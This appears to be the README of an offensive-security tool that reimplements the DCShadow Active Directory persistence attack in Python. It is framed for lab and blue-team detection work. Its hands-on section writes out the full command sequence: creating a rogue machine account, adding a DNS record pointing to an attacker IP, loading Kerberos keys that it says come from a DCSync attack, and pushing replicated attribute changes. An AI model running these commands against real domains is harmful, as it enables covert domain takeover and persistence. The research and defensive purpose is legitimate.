> [!WARNING]
> DO NOT RUN IN PRODUCTION. This is meant for lab testing, for blue teams to work on identifying IoCs, event types, and behavior.
> Also, this tool is provided as-is. No support is planned apart from standard review on pull requests you may want to create. 
> Don't run this from a Windows host. Do it from linux, or from a VM (to avoid RPC services conflicts).

# Theory

This project is meant to be a pure-python alternative to Mimikatz's dcshadow technique. This includes a custom Impacket with modified `crypto`, `gssapi` and `drsuapi` among other things. 

[DCShadow](https://www.thehacker.recipes/ad/persistence/dcshadow/) is a powerful persistence technique that could be considered as a transport for other techniques such as [SID history](https://www.thehacker.recipes/ad/persistence/sid-history), [KRBTGT RBCD](https://www.thehacker.recipes/ad/persistence/kerberos/delegation-to-krbtgt), [ACE abuse](https://www.thehacker.recipes/ad/persistence/dacl), and more.

This tool could be a foundation for a more versatile AD pertistence framework, that could be used by our community to raise our global maturity on the matter.

This tool was tested on [GOAD](https://github.com/Orange-Cyberdefense/GOAD).

# Hands-on

## 0. Install

```bash
python3 -m venv venv
source ./venv/bin/activate
pip3 install -r ./requirements.txt
pip3 install ./impacket
```

## 1. Create machine account

This machine will be registered as a domain controller for the duration of the replication, and will be unregistered at the end.

```bash
venv/bin/addcomputer.py -computer-name 'fake701$' -computer-pass '123soleil!' -method LDAPS -dc-host "kingslanding.sevenkingdoms.local" -dc-ip "192.168.10.10" -domain-netbios "sevenkingdoms" "sevenkingdoms.local"/"tyron.lannister":"Alc00L&S3x" -debug
```

> [!WARNING]
> adcomputer.py is modified to set `msDS-SupportedEncryptionTypes` to `0x1f`. Latest tests seem to raise a constraint violation.
> ```
> [+] Impacket Library Installation Path: /workspace/adpersist/venv/lib/python3.11/site-packages/impacket
> Traceback (most recent call last):
>  File "/workspace/adpersist/venv/bin/addcomputer.py", line 248, in run_ldaps
>    raise Exception(str(ldapConn.result))
> Exception: {'result': 19, 'description': 'constraintViolation', 'dn': '', 'message': '0000207C: AtrErr: DSID-03153410, #1:\n\t0: 0000207C: DSID-03153410, problem 1005 (CONSTRAINT_ATT_TYPE), data 0, Att 907ab (msDS-SupportedEncryptionTypes)\n\x00', 'referrals': None, 'type': 'addResponse'}
> [-] {'result': 19, 'description': 'constraintViolation', 'dn': '', 'message': '0000207C: AtrErr: DSID-03153410, #1:\n\t0: 0000207C: DSID-03153410, problem 1005 (CONSTRAINT_ATT_TYPE), data 0, Att 907ab (msDS-SupportedEncryptionTypes)\n\x00', 'referrals': None, 'type': 'addResponse'}
> ```
> For now, use the regular addcomputer.py script from Impacket, and modify `msDS-SupportedEncryptionTypes` manually through ADSI edit.

## 2. DNS entry for the machine

This is needed for the legit DC to know how to reach the rogue DC and avoid `ERROR_DS_DNS_LOOKUP_FAILURE` errors.

```bash
dnstool.py -u "sevenkingdoms.local"/"tyron.lannister" -p "Alc00L&S3x" --record 'fake701' --action add --data "$ATTACKER_IP" "kingslanding.sevenkingdoms.local"
```

> [!TIP]
> If the command doesn't work for some reason, add the DNS entry manually through the DNS tools on the domain controller.

## 3. Rogue DC credentials

When we started developping this tool, we were using hardcoded credentials in an .env file, loaded in the `gss_kerberos_ap_req` function in the `dcshadow/utils/server/RpcServer.py` file.

This clearly needs an upgrade. The password of the rogue DC account could be passed as CLI argument and kerberos keys calculated. Krbrelayx does that already, dacledit.py as well, it needs copy-pasting.

For now you need to export the Kerberos keys as environment variables.

It should look like this:

```
export RC4=652c1be004ef335aa218cfed8e9297fc
export AES128=710b676a1fec1c68edc44b759aace44a
export AES256=bc7564c2e7a2bc740c277ec39f8c5d81e03df8001b7d670f5b46c177242a8bbc
```

Those keys can be retrieve with through a [DCSync](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync) attack.

## 4. DCShadow (JSON file)

```bash
python3 dcshadow.py --json repl.json --domain "sevenkingdoms.local" --user "cersei.lannister" --password "il0vejaime" --dc-ip "192.168.10.10" --legit-dc-fqdn "kingslanding.sevenkingdoms.local" --rogue-dc-name "fake701"
```

> [!TIP]
> In this case, a `repl.json` file is used to specify the target objects and attributes. Alternatively, the tool supports inline options (e.g., `--object`, `--attribute`, and `--value`). 

# Common errors

## DRSReplicaAdd: timed out

If the DRSReplicaAdd times out, it probably is a networking/firewall issue on the machine running dcshadow.py (the rogue DC), that's probably not allowing incoming trafic on 135/TCP (epmapper) and 1337/TCP (or dynamic port if implemented in the future, for drsuapi)

## DRSReplicaAdd: rpc_s_access_denied

You'd need to run Wireshark on the legit domain controller, but the most probably root cause is you're trying to run this on a Windows machine, meaning when the legit DC asks your rogue DC's epmapper for the port of the drsuapi endpoint, the answer is empty since it's your own windows machine's epmapper that's responding and not our custom one. 

# Credits

This project wouldn't have been possible without the immense help of [Alessandro Iandoli "MrAle98"](https://github.com/MrAle98), a talented researcher met during the development. Thank you Alessandro!

Credits go to Benjamin Delpy and Vincent Letoux for the initial discovery, talks, and implementation in Mimikatz.

I'd like to thank Volker as well, who took part in the early development.

Thanks to Dramelac for the help in going for PoC to modular project, a foundation for a future framework, if it ever goes there.
